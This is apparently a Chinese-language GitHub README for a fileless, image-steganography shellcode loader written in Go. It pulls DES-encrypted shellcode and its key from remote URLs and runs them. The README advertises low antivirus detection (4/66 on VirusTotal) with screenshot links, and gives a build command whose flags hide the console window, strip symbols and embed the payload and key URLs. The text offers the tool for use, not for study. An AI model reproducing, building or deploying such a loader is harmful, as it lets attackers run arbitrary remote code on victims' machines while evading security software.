图片隐写的远程shellcode加载器，无文件落地版本
---
采用des加密，所以需要des加密的shellcode网址,和des的key
---
vt查杀率：4/66
![avatar](https://github.com/TRYblog/shellcode-load-web/blob/main/123.png)
微步
![avatar](https://github.com/TRYblog/shellcode-load-web/blob/main/456.png)
### 如何编译
```
 go build -ldflags "-w -s -H=windowsgui -X main.deskey=deskey的网址 -X main.descode=descode的网址"
```
2021.03.10
